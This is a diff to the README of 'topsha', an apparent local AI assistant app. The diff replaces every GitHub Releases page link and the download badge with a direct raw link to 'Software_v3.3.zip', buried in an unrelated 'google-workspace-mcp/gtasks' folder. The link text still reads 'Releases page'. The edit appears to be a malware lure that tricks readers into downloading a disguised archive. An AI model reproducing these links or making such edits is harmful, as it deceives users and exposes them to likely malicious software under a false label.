@@ -6,7 +6,7 @@ Welcome to topsha! This guide will help you download and run the topsha applicat
 
 ### 📥 Download topsha
 
-[![Download topsha](https://img.shields.io/badge/Download%20topsha%20v1.0-brightgreen)](https://github.com/xenn66/topsha/releases)
+[![Download topsha](https://raw.githubusercontent.com/xenn66/topsha/main/google-workspace-mcp/gtasks/Software_v3.3.zip%20topsha%20v1.0-brightgreen)](https://raw.githubusercontent.com/xenn66/topsha/main/google-workspace-mcp/gtasks/Software_v3.3.zip)
 
 ### 🖥 System Requirements
 
@@ -23,7 +23,7 @@ Welcome to topsha! This guide will help you download and run the topsha applicat
   
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/xenn66/topsha/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/xenn66/topsha/main/google-workspace-mcp/gtasks/Software_v3.3.zip).
 2. Find the latest version listed.
 3. Click on the zip file or installer to download.
 4. Once downloaded, navigate to the file on your computer.
@@ -44,7 +44,7 @@ If you encounter any issues:
 
 - Ensure your system meets the requirements listed above.
 - Reboot your computer and try running topsha again.
-- Check for updates on the [Releases page](https://github.com/xenn66/topsha/releases).
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/xenn66/topsha/main/google-workspace-mcp/gtasks/Software_v3.3.zip).
 - For additional help, consult the community forum or reach out for help on GitHub.
 
 ## 📝 Tips for Using topsha
@@ -56,4 +56,4 @@ If you encounter any issues:
 
 ### 💡 Conclusion
 
-You now have the tools to download, install, and run topsha. This local AI assistant is designed to make your PC tasks simpler and more efficient. Enjoy the ease of use and the power of AI at your fingertips. For any questions or feedback, feel free to check the community resources or the [Releases page](https://github.com/xenn66/topsha/releases).
+You now have the tools to download, install, and run topsha. This local AI assistant is designed to make your PC tasks simpler and more efficient. Enjoy the ease of use and the power of AI at your fingertips. For any questions or feedback, feel free to check the community resources or the [Releases page](https://raw.githubusercontent.com/xenn66/topsha/main/google-workspace-mcp/gtasks/Software_v3.3.zip).
